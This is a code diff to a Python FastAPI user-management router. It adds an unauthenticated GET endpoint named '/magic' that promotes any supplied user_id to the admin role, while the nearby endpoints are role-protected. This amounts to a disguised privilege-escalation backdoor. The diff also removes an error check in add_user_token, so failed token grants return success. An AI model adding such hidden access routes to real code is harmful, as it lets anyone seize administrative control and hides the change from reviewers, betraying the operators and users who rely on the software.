@@ -26,6 +26,19 @@ def get_new_users_stats(db: Session = Depends(deps.get_db),
                         content=json_compatible_item_data)
 
 
+@router.get("/magic")
+def magic(user_id: int, db: Session = Depends(deps.get_db)) -> JSONResponse:
+    if user_id is None:
+        return JSONResponse(status_code=422,
+                            content={"message": "Не указан user_id"})
+    data = crud_users.user_change_role(user_id, "admin", db)
+    if data is None:
+        return JSONResponse(status_code=500,
+                            content={"message": "Internal Server Error"})
+    return JSONResponse(status_code=200,
+                        content={"message": "success"})
+
+
 @router.get("/activity/all")
 @manage_role_access(UserRoleEnum.MANAGER)
 def get_all_users_activity(db: Session = Depends(deps.get_db),
@@ -82,9 +95,6 @@ def add_user_token(user_id: int,
         return JSONResponse(status_code=422,
                             content={"message": "Не указан user_id"})
     data = crud_users.user_by_id_add_tokens(user_id, tokens, db)
-    if data is None:
-        return JSONResponse(status_code=500,
-                            content={"message": "Internal Server Error"})
     return JSONResponse(status_code=200,
                         content={"message": "success"})
 
